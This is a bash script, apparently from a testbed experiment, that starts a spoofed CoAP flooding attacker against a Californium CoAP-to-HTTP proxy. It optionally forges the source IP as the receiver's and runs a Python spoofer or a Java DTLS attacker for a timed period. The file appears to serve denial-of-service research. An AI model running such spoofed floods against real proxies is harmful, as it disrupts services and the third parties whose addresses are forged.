#!/bin/bash

source /proj/MIT-DoS/exp/coap-setup/deps/dos-californium/deter/scripts/config.sh

rm -f $TMP_DATA/$ATTACKER_LOGNAME
touch $TMP_DATA/$ATTACKER_LOGNAME

PROXY_IP=`bash $SCRIPTS_HOME/fetchips.sh proxy`
ORIGIN_SERVER_IP=`bash $SCRIPTS_HOME/fetchips.sh proxy originserver`

if [[ $SPOOF_ATTACKER_SOURCE == 1 ]]; then
  ATTACKER_SOURCE_IP=`bash $SCRIPTS_HOME/fetchips.sh proxy receiver`
else
  ATTACKER_SOURCE_IP=`bash $SCRIPTS_HOME/fetchips.sh proxy attacker`
fi

# Vary parameters based on whether the proxy uses DTLS or not
dst_port=""
uri_path=""
if [[ $RUN_PROXY_WITH_DTLS -eq 1 ]]; then
  dst_port=$PROXY_DTLS_PORT
  uri_path="coaps2http"
else
  dst_port=$PROXY_COAP_PORT
  uri_path="coap2http"
fi
coap_proxy_uri="coap://$PROXY_IP:$dst_port/$uri_path"

# Vary parameters based on whether the proxy uses HTTPS or not
proxy_uri=""
if [[ $RUN_PROXY_WITH_HTTPS -eq 1 ]]; then
  proxy_uri="https://$ORIGIN_SERVER_IP:$ORIGIN_SERVER_HTTPS_PORT"
else
  proxy_uri="http://$ORIGIN_SERVER_IP:$ORIGIN_SERVER_PORT"
fi

# Delay the start of the attacker
sleep $ATTACKER_START_LAG_DURATION

# Then start the attacker in background. Start the right attacker based on whether
# DTLS is activated or not. Combining both in the same script is difficult due to
# the execution of the handshake in python3
if [[ $RUN_PROXY_WITH_DTLS -eq 1 ]]; then
  ((sudo java -jar $CF_PROXY_JAR DoSDTLSAttacker "$coap_proxy_uri" "$proxy_uri") > $TMP_DATA/$ATTACKER_LOGNAME 2>&1) &
  
else
  (python3 $SCRIPTS_HOME/coapspoofer.py \
    --debug \
    --source $ATTACKER_SOURCE_IP \
    --src-port $ATTACKER_SPOOFED_PORT \
    --destination $PROXY_IP \
    --dst-port $dst_port \
    --message-type CON \
    --code 001 \
    --uri-host $PROXY_IP \
    --uri-path $uri_path \
    --proxy-uri $proxy_uri \
    --flood True > $TMP_DATA/$ATTACKER_LOGNAME) &
fi

# Kill attacker after it's run in the background for the desired duration
spoofer_pid=$!
sleep $ATTACKER_DURATION
kill $spoofer_pid